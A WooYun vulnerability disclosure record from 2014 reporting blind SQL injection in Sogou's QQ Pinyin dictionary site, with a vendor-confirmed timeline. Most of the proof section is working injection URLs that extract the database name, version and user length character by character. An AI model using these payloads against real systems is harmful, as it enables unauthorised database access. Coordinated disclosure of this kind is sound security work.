{"id": 48090, "wybug_id": "wooyun-2014-084285", "wybug_title": "搜狗网站（QQ输入法）网站盲注漏洞", "wybug_corp": "搜狗", "wybug_author": "Tea", "wybug_date": "2014-11-22 21:46", "wybug_open_date": "2015-01-06 21:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向公众公开  简要描述： 发现两个盲注漏洞，过滤了点字符，无伤大碍，还是能获取到数据的。 详细说明：  两个注入漏洞一起发吧http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学(SQLI)http://dict.qq.pinyin.cn/dict_list?key=F1(SQLI)基于显示页面的内容作为参考，进行注入。   漏洞证明：  POC：and ascii(substring((version()),1,1)) BETWEEN 50 and 53;http://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20And%20(select%20length(database()))=6%23http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学' And (select length(database()))=6#数据库名长度6http://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20And%20(select%20length(version()))=10%23http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学' And (select length(version()))=10#数据库版本长度10http://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20And%20(select%20length(user()))=17%23http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学' And (select length(user()))=17#数据库用户名长度17And (select length(version()))=10http://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20And%20(select%20length(version()))%20BETWEEN%2010%20and%2010%23http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学' And (select length(version())) BETWEEN 10 and 10#http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学' and ascii(substring((version()),1,1)) BETWEEN 53 and 53#ascii 53  字符 5http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学' and ascii(substring((version()),2,1)) BETWEEN 46 and 46#ascii 46 字符 .http://dict.qq.pinyin.cn/dict_list?sort1=文化艺术&sort2=文学' and ascii(substring((version()),3,1)) BETWEEN 53 and 53#ascii 53  字符 510个字符，这里就偷懒了。就列出前面三个字符。MYSQL5版本http://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20and%20ascii(substring((database()),1,1))%20BETWEEN%20113%20and%20113%23ascii 113  字符 qhttp://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20and%20ascii(substring((database()),2,1))%20BETWEEN%20113%20and%20113%23ascii 113  字符 qhttp://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20and%20ascii(substring((database()),3,1))%20BETWEEN%20100%20and%20100%23ascii 100  字符 dhttp://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20and%20ascii(substring((database()),4,1))%20BETWEEN%20105%20and%20105%23ascii 105 字符 ihttp://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20and%20ascii(substring((database()),5,1))%20BETWEEN%2099%20and%2099%23ascii 99  字符 chttp://dict.qq.pinyin.cn/dict_list?sort1=%CE%C4%BB%AF%D2%D5%CA%F5&sort2=%CE%C4%D1%A7%27%20and%20ascii(substring((database()),6,1))%20BETWEEN%20116%20and%20116%23ascii 116 字符 t所以database()=> \"qqdict\"另外的验证http://dict.qq.pinyin.cn/dict_list?key=%25%27%20and%20%27%%27=%271http://dict.qq.pinyin.cn/dict_list?key=F1%%27%20And%20(select%20length(version()))=10%23图片验证：\n\n\n\n   修复方案：  ..   版权声明：转载请注明来源 Tea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-11-26 10:44 厂商回复： 收到，感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}